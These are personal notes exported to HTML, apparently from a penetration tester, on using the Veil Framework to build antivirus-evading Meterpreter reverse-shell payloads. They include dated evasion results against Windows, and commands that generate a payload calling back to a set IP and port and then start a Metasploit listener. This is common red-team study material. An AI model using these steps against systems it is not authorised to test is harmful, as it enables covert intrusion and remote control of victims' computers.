<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Veil Framework</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Antivirus Evasion- Veil Framework</h1></strong><br /><a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a><br /><br />Veil Framework includes a few different sets of tools:<br />• Veil Evasion - turns a script or shellcode into a Windows executable that will evade antivirus<br />• Veil Ordinance - generates MSF stager shellcode that can be used for exploits or payloads<br /><br />Veil 3.0 written in python3.<br /><br /><strong><h2>## Observations</h2></strong><br /><strong><h3>### 4th May 2020</h3></strong><br />As of 4th May 2020 against Windows 1809, it&#39;s pretty crap.<br /><br />• Tends not to evade<br />   ◇ C<br />      ▪ 7 - c/meterpreter/rev_tcp.py<br />   ◇ PowerShell<br />      ▪ 22 - powershell/meterpreter/rev_tcp.py<br />   ◇ Python<br />      ▪ 26 - python/meterpreter/rev_http.py<br />      ▪ 27 - python/meterpreter/rev_https.py<br />   ◇ C#<br />      ▪ 11 - cs/meterpreter/rev_tcp.py<br />• Tends to evade<br />   ◇ C<br />      ▪ 5 - c/meterpreter/rev_http.py (but causes WerFault.exe and doesn&#39;t give rev shell)<br /><br /><strong><h2>## Install</h2></strong><br />(Parrot OS)<br /><code>sudo apt install veil</code><br /><br /><strong>Errors</strong><br /><code>ERROR #2-3: Can&#39;t find the WINE profile for AuotIT v3</code><br />Move AutoIt3 folder from <code>Program Files (x86)</code> to <code>Program Files</code><br /><br /><strong><h2>## Usage</h2></strong><br />Can use CLI or interactive.<br />Use interactive if you want more options.<br /><br /><strong><h3>### CLI</h3></strong><br /><code>veil --help</code><br /><code>sudo veil -t Evasion --list-payloads</code><br /><code>sudo veil -t Evasion --ip 192.168.1.73 --port 443 -p 11 -o veil4</code><br /><br /><strong><h3>### Interactive</h3></strong><br />Start as root (think needs root because it writes/reads from root owned locations / install dir)<br /><code>sudo veil</code><br /><br /><code>use</code> (1) Evasion or (2) Ordinance<br /><br /><strong>#### Evasion</strong><br />1. <code>list</code> payloads<br />2. <code>info 22</code> - show payload info<br />3. <code>use 22</code> - use payload 22<br />4. <code>set</code> all necessary options<br />• LHOST<br />• LPORT<br />5. <code>generate</code><br /><br />Start metasploit listener with provided resource - <code>rc</code> - file.<br /><code>sudo msfconsole -r /var/lib/veil/output/handlers/veil1.rc</code><br /><br /></div>
</body>
</html>
